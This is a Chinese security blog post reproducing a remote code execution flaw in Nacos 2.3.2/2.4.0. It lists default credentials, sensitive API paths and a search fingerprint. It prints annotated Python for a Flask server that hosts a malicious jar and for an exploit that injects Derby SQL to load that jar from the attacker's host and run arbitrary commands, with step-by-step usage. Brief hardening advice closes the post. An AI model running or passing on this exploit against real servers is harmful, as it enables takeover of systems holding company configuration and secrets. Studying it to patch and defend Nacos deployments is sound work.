#  Nacos rce-0day漏洞复现（nacos 2.3.2）   
原创 LULU  红队蓝军   2024-08-12 18:02  
  
**前言**  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用  
。  
## nacos介绍   
  
NACOS是 一个开源的服务发现、配置管理和服务治理平台，属于阿里巴巴的一款开源产品。  
  
影像版本:nacos2.3.2或2.4.0版本  
  
指纹：fofa：app=“NACOS”  
  
<table><thead><tr><th style="line-height: 1.5em;letter-spacing: 0em;text-align: left;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">Nacos 测试基础信息</th><th style="line-height: 1.5em;letter-spacing: 0em;text-align: left;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">说明</th></tr></thead><tbody style="line-height: 1.5em;letter-spacing: 0em;border-width: 0px;border-style: initial;border-color: initial;"><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(255, 255, 255);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">默认帐户名密码</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">nacos/nacos</td></tr><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(248, 248, 248);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">常见端口</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">8848</td></tr><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(255, 255, 255);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">用户信息API</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</td></tr><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(248, 248, 248);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">集群信息API</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">/nacos/v1/core/cluster/nodes?withInstances=false&amp;pageNo=1&amp;pageSize=10&amp;keyword=</td></tr><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(255, 255, 255);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">配置信息API</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">dataId=&amp;group=&amp;appName=&amp;config_tags=&amp;pageNo=1&amp;pageSize=9&amp;tenant=&amp;search=accurate&amp;accessToken=&amp;username=</td></tr></tbody></table>  
  
从 Github 官方介绍文档可以看出国内不少大企业都在使用该系统，而从 issue 中也可以看出其 CVE 漏洞多且利用难度较低  
  
**Nacos系统历史CVE漏洞**  
```
1、CVE-2021-29441认证绕过
2、QVD-2023-6271默认密钥
3、CNVD-2020-67618 SQL注入
4、CNVD-2023-45001反序列化

```  
## 搭建Nacos 2.3.2 环境   
  
下载地址:https://github.com/alibaba/nacos/releases  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTpgdoySpZI29icUc91gQXPicWqyLWzmWwmvaKVk4jS9AMIhiaqIwwSYqTg/640?wx_fmt=png&from=appmsg "")  
  
**1、解压nacos文件**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTvWCAwH5QM9rpyyLpbytibL70YEYnLriaqnKzD0UMagFlHdbcOUfWgf4A/640?wx_fmt=png&from=appmsg "")  
  
**2、创建nacos数据库**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTugfkYcrfKOEa8jwwQ3fD0L4Wrddfuy1kSADxmblYdrbSbCM7vCC0Sg/640?wx_fmt=png&from=appmsg "")  
  
**执行mysql-schema.sql文件**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTXYibODHhohoVnan9UD2ISuN3Hr2V5dyUqKHjFTezfEtFxS39XBTGibLA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVT1p5gHKic5Ou9nJMjF8G7iaADbYBwn0KZg3LcZk7NBfcdr9iaZSOussoZg/640?wx_fmt=png&from=appmsg "")  
  
**3、配置数据源nacos/conf/application.properties**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVT1p5gHKic5Ou9nJMjF8G7iaADbYBwn0KZg3LcZk7NBfcdr9iaZSOussoZg/640?wx_fmt=png&from=appmsg "")  
  
**4、配置startup.cmd**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTDGz98umZ3pRWAERybXCYJZJ0AibeH2femQn1ibHdjumuke4e1ziclEzsA/640?wx_fmt=png&from=appmsg "")  
  
**5、启动Nacos**  
  
在bin目录下打开cmd，输入**startup.cmd -m standalone**启动  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTUia5ML27l53qXHXgBBSZ8icxAwTDgQ4qW2PWXFKicRwTKSwP7Mic8mrWGg/640?wx_fmt=png&from=appmsg "")  
  
访问http://localhost:8848/nacos  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTE1QeP5oX82Ke1KI5dlmhibGibScT1XCLglhdsicnyLtR2wsavv5DDEZEA/640?wx_fmt=png&from=appmsg "")  
## 漏洞分析   
  
**漏洞描述**  
  
RCE（Remote Code Execution，远程代码执行）漏洞是指攻击者能够在远程服务器上执行任意代码的安全漏洞。此类漏洞通常会让攻击者完全控制受影响的系统，导致严重的安全问题。  
  
漏洞的核心在于 Nacos 的某些接口没有严格的权限控制，攻击者可以通过特制的请求向 Nacos 服务器发送恶意数据，从而执行任意代码。需要登录到后台才能利用漏洞涉及到 Nacos 在处理反序列化数据时的缺陷，攻击者能够通过特定的 JSON 数据结构，远程执行恶意代码。以利用该漏洞读取敏感文件、执行系统命令。  
  
**poc**  
  
在Github上已删除  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTPEhenskYo8oTqY207ybtEphqjxlJoWCG3n8uCkTLHNhnsCRZfXh52g/640?wx_fmt=png&from=appmsg "")  
  
**代码分析---service.py**  
  
Flask应用程序提供了一个简单的文件下载服务。用户访问 /download 路由时，服务器会返回一个解码后的二进制文件。这个文件最初是通过Base64编码存储在 payload 变量中的。应用程序的主机和端口信息从 config.py 模块中读取  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTwyAwvxcDv9ibUUzOJx1HBuxTDVWquahAmsKosnAnB0dVrKB3FKI6ucQ/640?wx_fmt=png&from=appmsg "")  
```
#定义一个路由 /download，当用户访问这个URL时，调用 download_file 函数，请求download接口就会返回jar的内容
@app.route('/download')   
def download_file():
#将Base64编码的payload 解码为二进制数据。
    data = base64.b64decode(payload)  
#创建一个HTTP响应对象，包含解码后的数据，并 设置MIME类型为 application/octet-stream（表示二进制文件）。
    response = Response(data, mimetype="application/octet-stream")
#可以设置响应头，指示浏览器将内容作为附件下载，并指定文件名（这里被注释掉了）。
    # response.headers["Content-Disposition"] = "attachment; filename=file.bin"  
#返回响应对象。
    return response

```  
  
**代码分析---exploit.py **  
  
exploit.py会连接Nacos,然后请求Nacos的参数中注入了连接service.py的IP、端口，以及需要RCE的指令。请求到达nacos之后，利用deby数据库的漏洞，恶意请求service.py服务的接口，加载jar包内容。然后再输入RCE指令给jar包，运行这个命令。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTZ8ttTU6aBtly3UcmWznRhLONKN5hT2MzjYDCl7AOCRd5qTuq9OK4DQ/640?wx_fmt=png&from=appmsg "")  
```
# 按装订区域中的绿色按钮以运行脚本。
def exploit(target, command, service, args):
#构建用于发送请求的URL
    removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')
    derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
    print("正在进行碰撞,请耐心等待!!")
#循环----直到成功利用漏洞
    for i in range(0, sys.maxsize):
#id：生成一个随机字符串，用于标识SQL注入的payload
        id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
#post_sql：构建SQL注入的payload，安装一个恶意的Java函数
        post_sql = """CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)\n
        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{id}')\n
        CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'\n""".format(id=id, service=service);
#option_sql：构建SQL语句，利用恶意函数执行命令
        option_sql = "UPDATE ROLES SET ROLE='1' WHERE ROLE='1' AND ROLE=S_EXAMPLE_{id}('{cmd}')\n".format(id=id, cmd=command);
#get_sql：构建SQL查询，执行命令并获取结果                                                                                 get_sql = "select * from (select count(*) as b, S_EXAMPLE_{id}('{cmd}') as a from config_info) tmp /*ROWS FETCH NEXT*/".format(id=id, cmd=command);
        # get_sql = "select * from users /*ROWS FETCH NEXT*/".format(id=id,cmd=command);
        files = {'file': post_sql}
#requests.post：发送POST请求，上传恶意SQL
#requests.get：发送GET请求，执行命令并获取结果。
        post_resp = requests.post(url=removal_url, files=files, verify=False, headers=header, timeout=5)
        post_json = post_resp.json()
        if args.url:
            print(post_json)
        if (post_json['code'] == 404 or post_json['code'] == 403) and "File" not in post_json['message']:
            print(Fore.YELLOW + f"[-] {target} 可能不存在Nacos_Rce漏洞\n" + Fore.RESET)
            break
        if post_json.get('message', None) is None and post_json.get('data', None) is not None:
            print(post_resp.text)
            get_resp = requests.get(url=derby_url, params={'sql': get_sql}, verify=False, headers=header,
                                    timeout=5)
            print(Fore.RED + f"\n[+] {target} 存在Nacos_Rce漏洞，执行命令：{command}" + Fore.RESET)
            print(Fore.RED + f"[+] 返回的结果如下: {get_resp.text}" + Fore.RESET)
            break


if __name__ == '__main__':
#service：构建下载恶意Jar文件的URL。
    service = 'http://{host}:{port}/download'.format(host=config.server_host, port=config.server_port)
#target 和 command：从用户输入获取目标URL和要执行的命令。
    target = 'http://127.0.0.1:8848'
    command = 'calc'
    target = input('请输入目录URL，默认：http://127.0.0.1:8848：') or target
    command = input('请输入命令，默认：calc：') or command
#exploit：调用漏洞利用函数。
    exploit(target=target, command=command, service=service)


```  
## 漏洞复现   
```
第一步：安装依赖requests和flask

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVT8G26mCLarWLHngLu3qISdGYxJqHhqHiamyRudSLicsGiatF9jjtHbxWXQ/640?wx_fmt=png&from=appmsg "")  
```
第二步：配置config.py中的ip和端口，需要安装依赖

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTJib4D5OV9SAlTLOghMFQOx0pewnCwdlG1mBqhB8VLWiat86t80k5HL1A/640?wx_fmt=png&from=appmsg "")  
```
第三步;启动恶意服务端:python server.py，把上面的恶意类通过b64压缩处理，加载在fask服务端当作服务器资源

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVT0gMJFbxfMZjAgC1C4ibbwGEaFWTicAHFDPPTIO4Tqs42icJUAFjvtpbCQ/640?wx_fmt=png&from=appmsg "")  
```
第四步：执行exploit.py，输入命令即可执行.默认执行calc

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTc4pZYL64icumu8SO32ibfK1fRQmGiclo5vGdjXQibBtAJJby7UuW4f7ib8Q/640?wx_fmt=png&from=appmsg "")  
## 安全加固建议   
- 对于使用单机模式的用户，Nacos社区建议开启鉴权机制以增强安全性。这可以通过设置相关配置实现，确保他人无法滥用接口。  
  
- 在文件application.properties开启鉴权  
  
开启鉴权之前![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTz0Q2DcfCpT5tzOpia0Whk2J4mt4secPiazy8WserNQjkwbCxP1uCENrQ/640?wx_fmt=png&from=appmsg "")  
  
  
开启鉴权之后  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6WNrvHHS0yI7WD0Kc7HMVTzISLf1dE0jElIf96NnIN8TvWmzx9ZvzIGVnrnNMLu2LuUiaS3VI56Zw/640?wx_fmt=png&from=appmsg "")  
  
  
加下方wx，拉你一起进群学习  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v5KP8CaWoS7GAJnWQQxPpibNdibOdl0hc3X6uuBy7rLVOoxS0OSd4vdHWcibFpZg9T9Bx6T7Rn87RoIw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
